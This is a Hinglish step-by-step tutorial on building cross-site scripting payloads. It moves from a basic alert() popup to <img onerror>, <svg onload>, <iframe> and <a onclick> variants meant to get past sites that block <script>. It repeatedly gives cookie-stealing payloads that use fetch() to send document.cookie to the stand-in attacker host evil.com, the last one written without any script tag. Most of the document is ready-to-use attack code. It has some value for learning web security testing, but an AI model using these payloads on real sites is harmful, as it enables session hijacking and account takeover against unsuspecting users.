# 💣 XSS Payload Banana – Step by Step

🔹 Step 1: Start karo <script> tag se

Yeh browser ko batata hai ke ab JavaScript chalne wali hai.

**<script>**

🔹 Step 2: JavaScript code likho uske andar

Sabse simple payload hota hai **alert('XSS')** — isse popup aata hai.

**<script>
alert('XSS');
</script>**

🔹 Step 3: End karo </script> se

Yeh batata hai ke JavaScript ka block khatam ho gaya.

---

### ✅ Final Payload:

**<script>alert('XSS');</script>**

---

### 🔥 Advanced Payload Example:

Agar tum cookie nikalna chahte ho:

**<script>
fetch("https://evil.com/steal?c=" + document.cookie);
</script>**

Yahan:

document.cookie → user ki cookie le raha hai

fetch() → us cookie ko attacker ki site par bhej raha hai

---

### ⚠️ Bonus Tip:

Kayi websites <script> block karti hain. Tab tum alternate technique use karte ho:

**<img src=x onerror=alert('XSS')>**

Yahan:

**<img>** toh allow hai

**onerror** JavaScript chala deta hai jab image load na ho

# 🔰 1. <img> tag ke saath XSS Payload

**<img src="x" onerror="alert('XSS')">**

### ✅ Kya ho raha hai?

**src="x"** → image load nhi ho paayi

**onerror="..."** → jab error aaya toh JavaScript chali

Isme " quotes use hue hain attribute values ke liye

Aur 'XSS' single quotes alert ke message mein

---

### 🔰 2. <iframe> tag ke saath XSS Payload

**<iframe src="javascript:alert('XSS')"></iframe>**

Kuch browsers allow nhi karte, lekin testing ke liye useful hai

---

### 🔰 3. <svg> + onload

**<svg onload="alert('XSS')"></svg>**

svg graphics ke liye hota hai, lekin onload ke through JavaScript chala sakte ho

---

### 🔰 4. Anchor Tag <a> with onclick

**<a href="#" onclick="alert('XSS')">Click me</a>**

Jab banda is link pe click kare, XSS payload trigger hoga

---

## 📌 "Double Quotes" aur 'Single Quotes' ka use:

Situation	Use

HTML attribute ke liye	"..." double quotes

JavaScript string ke liye	'...' single quotes ya double bhi chal jaata hai


Example:

**<img src="x" onerror="alert('Hello')">**

**"x"** → image path

**onerror="alert('Hello')"** → **outer quotes "..."** (HTML)

inner 'Hello' → (JavaScript)

---

### 📌 + ka use kab hota hai?

**+** ka use hota hai string concatenate karne ke liye JavaScript mein.
Matlab, do cheezein jorna.

Example:

**<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>**

**"https://..."** ek string hai

**document.cookie** second part

**+** dono ko jod raha hai

### Result: **https://evil.com/steal?cookie=abc123xyz** (cookie wali URL ban gayi)

---

### ✅ Real-World Example: Pure HTML Based XSS (no <script>)

```<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">```



